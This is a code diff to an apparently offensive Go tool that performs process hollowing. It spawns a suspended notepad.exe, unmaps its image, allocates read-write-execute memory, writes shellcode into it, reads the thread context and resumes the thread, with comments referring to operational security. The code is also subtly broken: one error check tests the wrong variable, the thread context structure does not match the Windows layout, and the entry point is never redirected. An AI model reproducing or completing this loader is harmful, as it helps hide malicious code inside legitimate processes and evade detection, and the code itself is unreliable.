@@ -63,13 +63,64 @@ const (
 
 	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)
 
-	PAGE_READWRITE    = 0x04
-	PAGE_EXECUTE_READ = 0x20
+	PAGE_READWRITE          = 0x04
+	PAGE_EXECUTE_READ       = 0x20
+	PAGE_READ_WRITE_EXECUTE = 0x40
 
 	CREATE_NO_WINDOW = 0x08000000
 
 	THREAD_SET_CONTEXT = 0x0010
+
+	CONTEXT_i386    = 0x10000
+	CONTEXT_INTEGER = (CONTEXT_i386 | 0x02)
 )
+
+type FLOATING_SAVE_AREA struct {
+	ControlWord  uint
+	StatusWord   uint
+	TagWord      uint
+	ErrorOffset  uint
+	DataOffset   uint
+	DataSelector uint
+	RegisterArea uint
+	Cr0NpxState  uint
+}
+
+type CONTEXT struct {
+	//retrieved by CONTEXT_DEBUG_REGISTER
+	ContextFlags uint
+	Dr0          uint
+	Dr1          uint
+	Dr2          uint
+	Dr3          uint
+	Dr4          uint
+	Dr5          uint
+	Dr6          uint
+	Dr7          uint
+	//retrieved by CONTEXT_FLOATING_POINT
+	FloatSave FLOATING_SAVE_AREA
+	//retrieved by CONTEXT_SEGMENTS
+	segGs uint
+	segFs uint
+	segEs uint
+	segDs uint
+	//retrieved by CONTEXT_INTEGER
+	Edi uint
+	Esi uint
+	Ebx uint
+	Edx uint
+	Ecx uint
+	Eax uint
+	//retrieved by CONTEXT_CONTROL
+	Ebp    uint
+	Eip    uint
+	SegCs  uint
+	EFlags uint
+	Esp    uint
+	SegSs  uint
+	//retrieved by CONTEXT_EXTENDED REGISTERS
+	ExtendedRegisters []byte
+}
 
 func main() {
 
@@ -91,7 +142,6 @@ func main() {
 	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
 	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
 	GetThreadContext := kernel32.NewProc("GetThreadContext")
-	ResumeThread := kernel32.NewProc("ResumeThread")
 
 	NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
 
@@ -101,7 +151,7 @@ func main() {
 	var tsec windows.SecurityAttributes
 
 	//create suspended process - CreateProcess
-	argv = syscall.StringToUTF16Ptr("C:\\WINDOWS\\system32\\notepad.exe")
+	argv := syscall.StringToUTF16Ptr("C:\\WINDOWS\\system32\\notepad.exe")
 	errCreateProcess := windows.CreateProcess(argv, nil, &psec, &tsec, false, CREATE_SUSPENDED, nil, nil, &si, &pi)
 
 	if errCreateProcess != nil {
@@ -111,7 +161,6 @@ func main() {
 		fmt.Println(fmt.Sprintf("[-]Successfully created a process with PID: %d", pi.ProcessId))
 	}
 
-	///FIX BELOW
 	//unmapping memory - NtUnmapViewOfSection
 	_, _, errNtUnmapViewOfSection := NtUnmapViewOfSection.Call(uintptr(pi.Process))
 
@@ -123,9 +172,8 @@ func main() {
 
 	}
 
-	//THIS IS PROB FINE
 	//Allocating memory in process - VirtualAllocEx
-	addr, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READWRITE)
+	addr, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READ_WRITE_EXECUTE)
 
 	if errVirtualAllocEx != nil && errVirtualAllocEx.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
@@ -149,8 +197,11 @@ func main() {
 
 	}
 
+	var cntx CONTEXT
+	cntx.ContextFlags = CONTEXT_INTEGER
+
 	//getting current thread context (to resume) GetThreadContext
-	_, _, errGetThreadContext := GetThreadContext.Call()
+	_, _, errGetThreadContext := GetThreadContext.Call(uintptr(pi.Thread), (uintptr)(unsafe.Pointer(&cntx)))
 
 	if errGetThreadContext != nil && errGetThreadContext.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling GetThreadContext:\r\n%s", errGetThreadContext.Error()))
@@ -160,14 +211,13 @@ func main() {
 
 	}
 
-	//Modifying permissions from RW to RX - VirtualProtectEx (RWX is bad and not opsec safe)
-	rw := PAGE_READWRITE
-	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pi.Process), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&rw)))
-	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
+	//resuming thread
+	_, errResumeThread := windows.ResumeThread(pi.Thread)
+	if errCreateProcess != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
+		fmt.Println(fmt.Sprintf("[-]Successfully resumed thread in: %d", pi.ProcessId))
 	}
 
 }
